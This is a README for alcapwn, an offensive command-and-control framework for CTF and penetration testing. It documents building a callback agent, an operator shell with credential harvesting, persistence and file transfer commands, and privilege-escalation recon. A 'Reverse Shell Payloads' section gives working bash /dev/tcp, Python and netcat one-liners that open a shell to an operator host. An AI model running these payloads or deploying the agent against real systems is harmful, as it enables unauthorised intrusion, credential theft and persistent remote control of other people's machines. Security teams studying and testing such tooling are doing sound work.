<p align="center">
  <img src="alcapwn_logo.png" alt="alcapwn" width="400">
<br />
CLI-based C2 framework for CTF and authorized penetration testing. Catches reverse shells, upgrades them to PTY, runs automated recon, and manages multiple sessions from an interactive operator shell.
</p>

## Install

```bash
# Homebrew (not yet available — pending first tag release):
brew tap exec/homebrew-tap && brew install alcapwn

# Build from source:
go build -o alcapwn .
```

## Quick Start

```bash
./alcapwn -l 0.0.0.0:4444
```

Then from the operator shell:

```
alcapwn> listen 0.0.0.0:5555    # start additional listeners
alcapwn> sessions                # list active sessions
alcapwn> use 1                   # attach interactively (Ctrl+D to background)
alcapwn> info 1                  # print full recon summary
alcapwn> tls 1                   # upgrade session to TLS in-place
```

## Agent Binary

alcapwn ships with a standalone agent binary for structured C2 (no PTY shell required).

```bash
# Build for the local platform:
CGO_ENABLED=0 go build -o agent_bin \
  -ldflags "-X main.lhost=<your-ip> -X main.lport=4444 -X main.interval=30 -X main.jitter=5" \
  ./agent/

# Cross-compile for Linux arm64:
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -o agent_arm64 \
  -ldflags "-X main.lhost=<your-ip> -X main.lport=4444" \
  ./agent/
```

The agent auto-reconnects, identifies itself by hardware fingerprint, and accepts
`exec`, `download`, and `upload` tasks. Set `ALCAPWN_DEBUG=1` on the target to
enable agent-side stderr logging.

## Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/<ip>/4444 0>&1

# Python
python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("<ip>",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/bash")'

# Netcat
nc -e /bin/sh <ip> 4444
```

## Operator Shell

alcapwn drops into an interactive prompt after launch. All session management happens here — no need to restart between connections.

```
  LISTENERS
    listen <host:port>       Start a new TCP listener
    listeners                List active listeners
    unlisten <port|addr>     Stop a listener

  SESSIONS
    sessions                 List all active sessions
    use <id>                 Attach to a session interactively (Ctrl+D to background)
    kill <id>                Terminate a session
    rename <id> <name>       Label a session for easier tracking
    tls <id>                 Upgrade a plain session to TLS encryption
    fp [id]                  Show TLS certificate fingerprint
    reset <id>               Respawn a new shell from session, close old one
    recon <id>               Run automated recon on a session manually
    info <id>                Print full recon summary (includes harvested creds if run)
    creds <id> [path]        Harvest credentials (shadow, SSH keys, env, history, .env)
    export <id|all> [--format json|txt] [path]  Save findings to disk
    broadcast <cmd>          Send a command to all active sessions

  FILE TRANSFER
    download <id> <path>     Download file from session
    upload <id> <path>       Upload file to session

  PERSISTENCE
    persist create <name> <method>  Create a persistence profile
    persist <id> <method>           Install persistence on session
    persist list                    List all persistence profiles
    persist list <id>               List persistence for a session
    persist remove <profile_id>     Remove a persistence profile
    persist assign <pid> <id>       Assign profile to session
    persist unassign <pid> <id>     Remove session from profile
    labels <id> [labels...]         Add/view labels on a session
    notes <id> [text...]            Add/view notes on a session

  FIREWALL
    firewall create <name>          Create a named firewall
    firewall list                   List all firewalls
    firewall delete <name>          Delete a firewall
    firewall rule <name> <ip>       Add firewall rule
    firewall rules <name>           List rules for firewall
    firewall clear <name>           Clear all rules
    firewall assign <name> <addr>   Assign firewall to listener

  OPERATOR
    help                            Show command list
    exit                            Exit (prompts if sessions are active)
```

Arrow keys and command history are supported at the operator prompt.

## Session Lifecycle

```
[target connects]
    ↓
[+] Session [1] opened — 192.168.1.50:54312
    ↓  PTY upgrade (spinner)
    ↓  TLS reconnect (if --tls or 'tls 1')
    ↓  Automated recon (silent)
[+] Session 1 ready
alcapwn>
```

Sessions are backgrounded after recon completes. Use `use <id>` to attach interactively. `Ctrl+D` backgrounds the session; `Ctrl+C` is forwarded to the remote shell.

## Automated Recon

On each new session alcapwn silently runs recon and stores findings in memory:

- Identity, OS, kernel version
- Sudo NOPASSWD rules
- SUID/SGID binaries matched against GTFOBins
- CVE candidates (PwnKit, Baron Samedit, sudo bypass)
- Linux capabilities, writable cron paths, interesting files
- Running services and version strings

Results are accessible via `info <id>` and `sessions`. Findings stay in memory until the session is killed.

## Flags

```
  -l HOST:PORT     Start a listener on launch
  -T / --tls       Automatic TLS on all sessions (ephemeral cert)
  -r / --recon     Run automated recon on every new session (off by default)
  -t SEC           Per-section recon timeout, seconds (default 15, range 5–300)
  -o DIR           Save findings JSON to DIR (off by default)
  --raw DIR        Save raw terminal capture to DIR (off by default)
  -v / -v=1 / -v=2 Verbosity (default quiet; 1 = status messages; 2 = debug)
```

Recon is opt-in. Use `recon <id>` to run it on a specific session at any time.

## TLS

```bash
# Auto-TLS on all sessions:
./alcapwn --tls -l 0.0.0.0:4444

# Upgrade a specific session manually:
alcapwn> tls 1

# Verify the certificate in use:
alcapwn> fp
alcapwn> fp 1
```

alcapwn generates an ephemeral self-signed cert per run. The Python TLS relay on the target asserts the SHA-256 fingerprint before connecting, preventing MITM. Use `fp` to retrieve the fingerprint for out-of-band verification.

## Security Notes

alcapwn defends against pbsh-style attacks (ANSI fragmentation, nonce reflection, DCS/PM injection). See `alcapwn_manual.md` for details.

## License

MIT — **Pwn responsibly.** Always have explicit written permission.
